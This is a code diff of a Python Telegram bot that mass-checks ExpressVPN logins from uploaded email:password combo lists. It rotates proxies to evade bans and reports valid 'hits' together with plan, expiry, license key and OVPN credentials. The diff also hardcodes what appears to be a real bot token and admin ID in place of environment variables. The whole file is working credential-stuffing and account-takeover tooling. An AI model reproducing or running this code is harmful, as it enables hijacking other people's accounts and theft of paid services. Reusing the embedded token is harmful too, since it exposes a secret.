@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ExpressVPN Telegram Bot - Production Grade
+# ExpressVPN Telegram Bot - Production Ready
 # Author: CAT Shadow Hacker
-# Version: 2.0.0
+# Token & Admin ID: Configured
 
 import asyncio
 import logging
@@ -45,33 +45,25 @@ from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
 from cryptography.hazmat.primitives.padding import PKCS7 as CryptoPKCS7
 from cryptography import x509 as crypto_x509
 from asn1crypto import cms, core, x509 as asn1_x509
-from dotenv import load_dotenv
 import aiohttp
 from aiohttp_socks import ProxyConnector
-from rich.console import Console
-from rich.table import Table
 
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ── Load Environment ───────────────────────────────────────────────────────
-load_dotenv()
+# ── CONFIGURATION ──────────────────────────────────────────────────────────
+BOT_TOKEN = "8136827302:AAHpATxlggGEUJ_Pw1DVB07eesKaWTlvOn8"
+ADMIN_IDS = [7305141058]
+ALLOWED_USERS = []  # Empty = allow everyone
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN not set in environment")
-
-ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
-ALLOWED_USERS = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip()]
-# If ALLOWED_USERS is empty, allow all users (but admin always allowed)
-
-MAX_THREADS = int(os.getenv("MAX_THREADS", "15"))
-RATE_LIMIT_PER_MINUTE = int(os.getenv("RATE_LIMIT_PER_MINUTE", "10"))
-MAX_QUEUE_SIZE = int(os.getenv("MAX_QUEUE_SIZE", "100"))
-PROXY_TIMEOUT = int(os.getenv("PROXY_TIMEOUT", "10"))
-REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))
-MAX_RETRIES = int(os.getenv("MAX_RETRIES", "3"))
-LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
+# Performance settings
+MAX_THREADS = 15
+RATE_LIMIT_PER_MINUTE = 10
+MAX_QUEUE_SIZE = 100
+PROXY_TIMEOUT = 10
+REQUEST_TIMEOUT = 30
+MAX_RETRIES = 3
+LOG_LEVEL = "INFO"
 
 # ── Logging ────────────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -112,44 +104,25 @@ CERT_B64 = (
 
 # ── Proxy Parser ───────────────────────────────────────────────────────────
 def parse_proxy_line(line: str) -> Optional[str]:
-    """
-    Parse proxy line in various formats and return a standardized URL.
-    Supports: HTTP, HTTPS, SOCKS4, SOCKS5
-    Formats:
-    - host:port
-    - user:pass@host:port
-    - protocol://host:port
-    - protocol://user:pass@host:port
-    """
     line = line.strip()
     if not line or line.startswith(('#', '//', ';')):
         return None
-
-    # Already has protocol
     if line.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
         return line
-
-    # user:pass@host:port
     if '@' in line and ':' in line.split('@')[0]:
         return f"http://{line}"
-
-    # host:port
     parts = line.split(':')
     if len(parts) == 2:
         host, port = parts
         if port.isdigit():
             return f"http://{host}:{port}"
-
-    # user:pass:host:port (alternative)
     if len(parts) == 4:
         user, passwd, host, port = parts
         if port.isdigit():
             return f"http://{user}:{passwd}@{host}:{port}"
-
     return None
 
 def parse_proxy_file(content: str) -> List[str]:
-    """Parse a proxy file and return a list of valid proxy URLs."""
     proxies = []
     for line in content.splitlines():
         parsed = parse_proxy_line(line)
@@ -219,19 +192,9 @@ def cms_encrypt(data: bytes) -> bytes:
     })
     return cms.ContentInfo({"content_type": "1.2.840.113549.1.7.3", "content": env}).dump()
 
-# ── Core Checker (Optimized) ──────────────────────────────────────────────
+# ── Core Checker ──────────────────────────────────────────────────────────
 def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dict[str, Any]:
-    """
-    Check an ExpressVPN account using the official API.
-    Returns a dict with 'status' and other fields.
-    """
-    result = {
-        "status": "ERROR",
-        "email": email,
-        "password": password,
-        "error": None
-    }
-
+    result = {"status": "ERROR", "email": email, "password": password, "error": None}
     try:
         iv_b = os.urandom(16)
         key_b = os.urandom(16)
@@ -250,7 +213,6 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
         hdr_sig = sig(f"POST /apis/v2/credentials?{qs}")
 
         proxies = {"http": proxy, "https": proxy} if proxy else None
-
         session = requests.Session()
         resp = session.post(
             f"{BASE_URL}/credentials?{qs}",
@@ -291,7 +253,6 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
             session.close()
             return result
 
-        # Extract access token
         token_match = re.search(r'"access_token":"([^"]+)"', body)
         if not token_match:
             result["status"] = "BAD"
@@ -299,12 +260,10 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
             return result
         token = token_match.group(1)
 
-        # Extract OVPN credentials (if present)
         ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', body)
         ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', body)
         ovpn = f"{ovpn_user.group(1)}:{ovpn_pass.group(1)}" if ovpn_user and ovpn_pass else ""
 
-        # Get subscription details via batch API
         sub_qs = (
             f"access_token={token}&client_version={CLIENT_VER}"
             f"&installation_id={iid}&os_name={OS_NAME}&os_version={OS_VER}"
@@ -337,16 +296,10 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
         bt = br.text or ""
 
         if "subscription" not in bt:
-            result.update({
-                "status": "EXPIRED",
-                "ovpn": ovpn,
-                "plan": "Unknown",
-                "expire": ""
-            })
+            result.update({"status": "EXPIRED", "ovpn": ovpn, "plan": "Unknown", "expire": ""})
             session.close()
             return result
 
-        # Parse subscription data
         ue = bt.encode().decode("unicode_escape", errors="replace")
 
         def extract(pattern: str, text: str = ue) -> str:
@@ -368,18 +321,11 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
         auto_match = re.search(r'auto_bill":([^,}]+)', ue)
         auto_bill = (auto_match.group(1).strip().lower() == "true") if auto_match else False
 
-        # Check if expired or revoked
         if (exp_ts and exp_ts < now) or (sub_status == "REVOKED" and not (exp_ts and exp_ts > now)):
-            result.update({
-                "status": "EXPIRED",
-                "plan": plan,
-                "expire": expire,
-                "ovpn": ovpn
-            })
+            result.update({"status": "EXPIRED", "plan": plan, "expire": expire, "ovpn": ovpn})
             session.close()
             return result
 
-        # Fetch license key
         license_key = ""
         try:
             lr = session.get(
@@ -399,7 +345,6 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
             pass
 
         session.close()
-
         result.update({
             "status": "HIT",
             "plan": plan,
@@ -427,7 +372,6 @@ def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dic
 
 # ── User State Manager ─────────────────────────────────────────────────────
 class UserState:
-    """Manages per-user state for the bot."""
     def __init__(self):
         self.current_job: Optional[Dict[str, Any]] = None
         self.job_queue: List[Dict[str, Any]] = []
@@ -446,7 +390,6 @@ class UserState:
         }
 
 class BotState:
-    """Global bot state."""
     def __init__(self):
         self.users: Dict[int, UserState] = defaultdict(UserState)
         self.total_checks: int = 0
@@ -487,7 +430,6 @@ def is_allowed(user_id: int) -> bool:
     return user_id in ALLOWED_USERS or is_admin(user_id)
 
 def format_result(result: Dict[str, Any]) -> str:
-    """Format a check result for display."""
     status = result.get("status", "UNKNOWN")
     email = result.get("email", "")
     password = result.get("password", "")
@@ -537,12 +479,11 @@ def format_result(result: Dict[str, Any]) -> str:
     elif status == "BAN":
         return f"🚫 <b>BANNED</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n<i>IP or account temporarily blocked</i>"
 
-    else:  # ERROR
+    else:
         error = result.get("error", "Unknown error")
         return f"⚠️ <b>ERROR</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n📝 {error}"
 
 def create_main_menu(user_id: int) -> InlineKeyboardMarkup:
-    """Create the main menu keyboard."""
     keyboard = [
         [
             InlineKeyboardButton("🚀 Start Check", callback_data="start_check"),
@@ -602,15 +543,12 @@ class CheckJob:
         self.start_time = datetime.now()
 
 async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    """Process a check job asynchronously."""
     user_state = bot_state.get_user(job.user_id)
     user_state.is_processing = True
 
-    # Prepare proxy pool
     proxy_pool = job.proxies if job.proxies else [None]
     proxy_idx = 0
 
-    # Create executor for CPU-bound tasks
     executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
     loop = asyncio.get_event_loop()
 
@@ -624,12 +562,10 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
             email = email.strip()
             password = password.strip()
         except ValueError:
-            # Invalid format
             job.progress["checked"] += 1
             job.progress["bad"] += 1
             return
 
-        # Try with retries
         for attempt in range(MAX_RETRIES):
             current_proxy = proxy_pool[proxy_idx % len(proxy_pool)] if proxy_pool else None
             proxy_idx += 1
@@ -654,7 +590,6 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
             status = result.get("status", "ERROR")
 
             if status == "BAN":
-                # Try a different proxy
                 proxy_idx += 1
                 await asyncio.sleep(2)
                 continue
@@ -663,7 +598,6 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
                 await asyncio.sleep(0.5)
                 continue
 
-            # Valid result
             job.progress["checked"] += 1
             if status == "HIT":
                 job.progress["hits"] += 1
@@ -677,11 +611,9 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
             results.append(result)
             break
 
-        # Update progress message every 5 results
         if len(results) % 5 == 0:
             await update_progress_message(job, context)
 
-    # Process all combos
     tasks = []
     for combo in job.combos:
         if not job.is_running:
@@ -692,7 +624,6 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
 
     await asyncio.gather(*tasks, return_exceptions=True)
 
-    # Finalize
     job.is_running = False
     user_state.is_processing = False
     user_state.results = results
@@ -700,12 +631,9 @@ async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
     bot_state.total_hits += job.progress["hits"]
 
     executor.shutdown(wait=False)
-
-    # Send final results
     await send_final_results(job, context)
 
 async def update_progress_message(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    """Update the progress message in Telegram."""
     try:
         progress = job.progress
         total = progress["total"]
@@ -720,7 +648,6 @@ async def update_progress_message(job: CheckJob, context: ContextTypes.DEFAULT_T
         filled = int(pct / 100 * bar_len)
         bar = "█" * filled + "░" * (bar_len - filled)
 
-        # Calculate speed
         elapsed = (datetime.now() - job.start_time).total_seconds()
         cpm = (checked / (elapsed / 60)) if elapsed > 0 else 0
 
@@ -744,16 +671,13 @@ Progress: [{bar}] {pct:.1f}%
         logger.error(f"Failed to update progress: {e}")
 
 async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
-    """Send the final results to the user."""
     user_id = job.user_id
     results = job.results
     progress = job.progress
 
-    # Prepare hit and expired messages
     hits = [r for r in results if r.get("status") == "HIT"]
     expired = [r for r in results if r.get("status") == "EXPIRED"]
 
-    # Summary message
     summary = f"""<b>✅ Check Complete!</b>
 
 📊 <b>Results Summary</b>
@@ -774,10 +698,9 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Send hits
     if hits:
         hit_text = "<b>✅ HITS</b>\n" + "─" * 20 + "\n"
-        for hit in hits[:50]:  # Limit to 50 per message
+        for hit in hits[:50]:
             hit_text += format_result(hit) + "\n" + "─" * 20 + "\n"
 
         if len(hits) > 50:
@@ -789,7 +712,6 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
 
-    # Send expired
     if expired:
         exp_text = "<b>⚠️ EXPIRED</b>\n" + "─" * 20 + "\n"
         for exp in expired[:50]:
@@ -804,7 +726,6 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
 
-    # Send file with all results if many
     if len(results) > 100:
         try:
             file_path = f"/tmp/results_{user_id}_{int(time.time())}.txt"
@@ -835,7 +756,6 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             logger.error(f"Failed to send results file: {e}")
 
-    # Return to main menu
     await context.bot.send_message(
         chat_id=user_id,
         text="🔙 <b>Return to main menu</b>",
@@ -843,7 +763,6 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Update user state
     user_state = bot_state.get_user(user_id)
     user_state.is_processing = False
     user_state.current_job = None
@@ -851,22 +770,19 @@ async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
 # ── Command Handlers ──────────────────────────────────────────────────────
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start command."""
     user = update.effective_user
     user_id = user.id
 
     if not is_allowed(user_id):
         await update.message.reply_text(
-            "🚫 <b>Access Denied</b>\n\n"
-            "You are not authorized to use this bot.",
+            "🚫 <b>Access Denied</b>\n\nYou are not authorized to use this bot.",
             parse_mode=ParseMode.HTML
         )
         return
 
     if bot_state.is_maintenance:
         await update.message.reply_text(
-            "🔧 <b>Maintenance Mode</b>\n\n"
-            "The bot is currently undergoing maintenance. Please try again later.",
+            "🔧 <b>Maintenance Mode</b>\n\nThe bot is currently undergoing maintenance.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -892,8 +808,6 @@ I can check ExpressVPN accounts for validity. Send me a file with accounts in <c
 1. Send a .txt file with <code>email:password</code> combos
 2. Or paste combos directly
 3. Use inline buttons to manage proxies
-
-<i>Tip: Use proxies for better performance!</i>
 """
     await update.message.reply_text(
         welcome_text,
@@ -902,7 +816,6 @@ I can check ExpressVPN accounts for validity. Send me a file with accounts in <c
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /help command."""
     user_id = update.effective_user.id
 
     if not is_allowed(user_id):
@@ -914,10 +827,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>📁 Accounts Format</b>
 Send a .txt file with one account per line:
 <code>email:password</code>
-
-Example:
-<code>user1@example.com:pass123
-user2@domain.com:secure456</code>
 
 <b>🌐 Proxy Support</b>
 Proxies can be in these formats:
@@ -931,17 +840,10 @@ For each account, I show:
 • Status: HIT / EXPIRED / BAD / ERROR
 • Plan and expiration date
 • License key (if available)
-• OVPN credentials (if available)
 
 <b>⚡ Tips</b>
 • Use good proxies to avoid bans
-• Recommended: 10-25 accounts per file
-• Large files may take time to process
-
-<b>🛡️ Privacy</b>
-• Results are only sent to you
-• No data is stored permanently
-• Your accounts are processed securely
+• Recommended: 10-50 accounts per file
 
 Use the buttons below to navigate! 👇
 """
@@ -953,7 +855,6 @@ Use the buttons below to navigate! 👇
     )
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stats command."""
     user_id = update.effective_user.id
 
     if not is_allowed(user_id):
@@ -992,7 +893,6 @@ Maintenance: {'🔧 ACTIVE' if bot_state.is_maintenance else '✅ Off'}
     )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle inline button callbacks."""
     query = update.callback_query
     await query.answer()
 
@@ -1022,8 +922,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "start_check":
         if user_state.is_processing:
             await query.edit_message_text(
-                "⏳ <b>Already processing!</b>\n\n"
-                "Please wait for your current check to complete.",
+                "⏳ <b>Already processing!</b>\n\nPlease wait for your current check to complete.",
                 reply_markup=create_main_menu(user_id),
                 parse_mode=ParseMode.HTML
             )
@@ -1045,7 +944,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=create_main_menu(user_id),
             parse_mode=ParseMode.HTML
         )
-        # Set state to expect combos
         context.user_data['expecting_combos'] = True
 
     elif data == "stats":
@@ -1074,9 +972,7 @@ socks5://proxy.com:1080</code>
 
     elif data == "import_proxies":
         await query.edit_message_text(
-            "📥 <b>Import Proxies</b>\n\n"
-            "Send me a <b>.txt</b> file with your proxies.\n"
-            "One proxy per line in any common format.",
+            "📥 <b>Import Proxies</b>\n\nSend me a <b>.txt</b> file with your proxies.",
             reply_markup=create_proxy_menu(),
             parse_mode=ParseMode.HTML
         )
@@ -1086,8 +982,7 @@ socks5://proxy.com:1080</code>
         count = len(user_state.proxies)
         user_state.proxies = []
         await query.edit_message_text(
-            f"🧹 <b>Proxies Cleared</b>\n\n"
-            f"Removed {count} proxies.",
+            f"🧹 <b>Proxies Cleared</b>\n\nRemoved {count} proxies.",
             reply_markup=create_proxy_menu(),
             parse_mode=ParseMode.HTML
         )
@@ -1095,14 +990,12 @@ socks5://proxy.com:1080</code>
     elif data == "show_proxies":
         if not user_state.proxies:
             await query.edit_message_text(
-                "📋 <b>No proxies loaded</b>\n\n"
-                "Import some proxies first!",
+                "📋 <b>No proxies loaded</b>",
                 reply_markup=create_proxy_menu(),
                 parse_mode=ParseMode.HTML
             )
             return
 
-        # Show first 20 proxies
         proxy_text = "<b>📋 Loaded Proxies</b>\n\n"
         for i, p in enumerate(user_state.proxies[:20], 1):
             proxy_text += f"{i}. <code>{p}</code>\n"
@@ -1132,8 +1025,6 @@ Total checks: {bot_state.total_checks:,}
 Total hits: {bot_state.total_hits:,}
 Users: {len(bot_state.users)}
 Errors logged: {len(bot_state.error_log)}
-
-<b>Queued jobs:</b> {len(context.job_queue.jobs()) if context.job_queue else 0}
 """
         await query.edit_message_text(
             text,
@@ -1142,11 +1033,6 @@ Errors logged: {len(bot_state.error_log)}
         )
 
     elif data == "admin_stats" and is_admin(user_id):
-        user_stats = []
-        for uid, state in bot_state.users.items():
-            if state.progress.get('total', 0) > 0:
-                user_stats.append(f"User {uid}: {state.progress['total']} checks, {state.progress['hits']} hits")
-
         text = f"""<b>📊 Detailed Stats</b>
 
 <b>Global</b>
@@ -1154,8 +1040,7 @@ Total checks: {bot_state.total_checks:,}
 Total hits: {bot_state.total_hits:,}
 Active users: {len(bot_state.users)}
 
-<b>User Activity</b>
-{chr(10).join(user_stats[:10]) or 'No activity recorded'}
+<b>Uptime:</b> {datetime.now() - bot_state.start_time}
 """
         await query.edit_message_text(
             text,
@@ -1186,8 +1071,7 @@ Active users: {len(bot_state.users)}
         bot_state.is_maintenance = not bot_state.is_maintenance
         status = "🔧 ACTIVE" if bot_state.is_maintenance else "✅ Off"
         await query.edit_message_text(
-            f"<b>Maintenance Mode</b>\n\n"
-            f"Status: {status}",
+            f"<b>Maintenance Mode</b>\n\nStatus: {status}",
             reply_markup=create_admin_menu(),
             parse_mode=ParseMode.HTML
         )
@@ -1222,14 +1106,6 @@ Active users: {len(bot_state.users)}
             parse_mode=ParseMode.HTML
         )
 
-    elif data == "back_to_admin":
-        await query.edit_message_text(
-            "⚙️ <b>Admin Panel</b>",
-            reply_markup=create_admin_menu(),
-            parse_mode=ParseMode.HTML
-        )
-
-    # Handle check cancellation
     elif data == "cancel_check":
         if user_state.is_processing and user_state.current_job:
             user_state.current_job.is_running = False
@@ -1255,7 +1131,6 @@ Active users: {len(bot_state.users)}
 # ── File and Text Handlers ──────────────────────────────────────────────
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded files."""
     user_id = update.effective_user.id
 
     if not is_allowed(user_id):
@@ -1267,8 +1142,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     user_state = bot_state.get_user(user_id)
-
-    # Check if expecting proxies or combos
     expecting_proxies = context.user_data.get('expecting_proxies', False)
     expecting_combos = context.user_data.get('expecting_combos', False)
 
@@ -1277,7 +1150,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Please send a valid file.")
         return
 
-    # Download file
     try:
         file = await context.bot.get_file(document.file_id)
         content = await file.download_as_bytearray()
@@ -1288,92 +1160,71 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if expecting_proxies:
-        # Import proxies
         proxies = parse_proxy_file(text)
         if not proxies:
             await update.message.reply_text(
-                "❌ No valid proxies found in the file.\n"
-                "Format: host:port or user:pass@host:port"
+                "❌ No valid proxies found in the file.\nFormat: host:port or user:pass@host:port"
             )
             return
 
         user_state.proxies.extend(proxies)
-        # Deduplicate
         user_state.proxies = list(dict.fromkeys(user_state.proxies))
 
         await update.message.reply_text(
-            f"✅ <b>Proxies Imported</b>\n\n"
-            f"Imported: {len(proxies)} proxies\n"
-            f"Total: {len(user_state.proxies)} proxies",
+            f"✅ <b>Proxies Imported</b>\n\nImported: {len(proxies)} proxies\nTotal: {len(user_state.proxies)} proxies",
             reply_markup=create_proxy_menu(),
             parse_mode=ParseMode.HTML
         )
         context.user_data['expecting_proxies'] = False
 
     elif expecting_combos or document.file_name.endswith('.txt'):
-        # Import combos
         combos = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
         if not combos:
             await update.message.reply_text(
-                "❌ No valid combos found.\n"
-                "Format: email:password (one per line)"
+                "❌ No valid combos found.\nFormat: email:password (one per line)"
             )
             return
 
         if len(combos) > 500:
             await update.message.reply_text(
-                f"⚠️ You're trying to check {len(combos)} accounts.\n"
-                "Please split into smaller files (max 500 per file)."
+                f"⚠️ Too many accounts ({len(combos)}).\nPlease split into smaller files (max 500)."
             )
             return
 
-        # Check rate limit
         if not rate_limiter.is_allowed(user_id):
             await update.message.reply_text(
-                "⏳ <b>Rate Limit Exceeded</b>\n\n"
-                f"Maximum {RATE_LIMIT_PER_MINUTE} checks per minute.\n"
-                "Please wait a moment before trying again.",
+                f"⏳ <b>Rate Limit Exceeded</b>\n\nMaximum {RATE_LIMIT_PER_MINUTE} checks per minute.",
                 parse_mode=ParseMode.HTML
             )
             return
 
         if user_state.is_processing:
             await update.message.reply_text(
-                "⏳ Already processing a check!\n"
-                "Please wait for it to complete.",
+                "⏳ Already processing a check!",
                 reply_markup=create_main_menu(user_id)
             )
             return
 
-        # Start processing
         await update.message.reply_text(
-            f"✅ <b>Starting check for {len(combos)} accounts</b>\n\n"
-            f"🔄 Processing... I'll update you here.",
+            f"✅ <b>Starting check for {len(combos)} accounts</b>\n\n🔄 Processing...",
             parse_mode=ParseMode.HTML
         )
 
-        # Create job
         job = CheckJob(user_id, combos, user_state.proxies.copy(), update.message)
         user_state.current_job = job
         user_state.is_processing = True
         context.user_data['expecting_combos'] = False
 
-        # Schedule job
         asyncio.create_task(process_job(job, context))
 
     else:
         await update.message.reply_text(
-            "📄 <b>Unsupported File</b>\n\n"
-            "Please send a .txt file with:\n"
-            "• Accounts: <code>email:password</code>\n"
-            "• Proxies: <code>host:port</code>\n\n"
-            "Use the buttons to specify what you're sending.",
+            "📄 <b>Unsupported File</b>\n\nPlease send a .txt file with accounts or proxies.",
             reply_markup=create_main_menu(user_id),
             parse_mode=ParseMode.HTML
         )
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle text input (combos)."""
     user_id = update.effective_user.id
 
     if not is_allowed(user_id):
@@ -1395,27 +1246,23 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_state = bot_state.get_user(user_id)
 
-    # Parse combos from text
     text = update.message.text
     lines = [line.strip() for line in text.splitlines() if line.strip()]
     combos = [line for line in lines if ':' in line]
 
     if not combos:
         await update.message.reply_text(
-            "❌ No valid combos found.\n"
-            "Format: <code>email:password</code> (one per line)",
+            "❌ No valid combos found.\nFormat: <code>email:password</code>",
             parse_mode=ParseMode.HTML
         )
         return
 
     if len(combos) > 200:
         await update.message.reply_text(
-            f"⚠️ Too many combos ({len(combos)}).\n"
-            "Please send a .txt file instead."
+            f"⚠️ Too many combos ({len(combos)}).\nPlease send a .txt file instead."
         )
         return
 
-    # Rate limit
     if not rate_limiter.is_allowed(user_id):
         await update.message.reply_text(
             "⏳ Rate limit exceeded. Please wait a moment.",
@@ -1430,7 +1277,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Start processing
     await update.message.reply_text(
         f"✅ Starting check for {len(combos)} accounts...",
         parse_mode=ParseMode.HTML
@@ -1446,21 +1292,18 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ── Error Handler ──────────────────────────────────────────────────────────
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle errors globally."""
     logger.error(f"Update {update} caused error {context.error}")
 
-    # Log error
     error_str = str(context.error)
     bot_state.error_log.append(f"{datetime.now().strftime('%H:%M:%S')} - {error_str[:100]}")
     if len(bot_state.error_log) > 1000:
         bot_state.error_log = bot_state.error_log[-500:]
 
-    # Notify user if possible
     if update and update.effective_user:
         try:
             await context.bot.send_message(
                 chat_id=update.effective_user.id,
-                text="⚠️ An error occurred while processing your request. Please try again."
+                text="⚠️ An error occurred. Please try again."
             )
         except Exception:
             pass
@@ -1468,13 +1311,10 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ── Main Application ──────────────────────────────────────────────────────
 
 def main():
-    """Start the bot."""
-    # Check if token exists
     if not BOT_TOKEN:
         logger.error("BOT_TOKEN not set!")
         sys.exit(1)
 
-    # Create application
     application = (
         Application.builder()
         .token(BOT_TOKEN)
@@ -1484,24 +1324,16 @@ def main():
         .build()
     )
 
-    # Command handlers
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("stats", stats_command))
-
-    # Callback handler
     application.add_handler(CallbackQueryHandler(button_callback))
-
-    # File and message handlers
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-
-    # Error handler
     application.add_error_handler(error_handler)
 
-    # Start bot
     logger.info("🚀 Starting ExpressVPN Checker Bot...")
-    logger.info(f"👥 Admins: {ADMIN_IDS}")
+    logger.info(f"👥 Admin: {ADMIN_IDS[0]}")
     logger.info(f"📊 Rate limit: {RATE_LIMIT_PER_MINUTE}/min")
     logger.info(f"🔧 Max threads: {MAX_THREADS}")
 
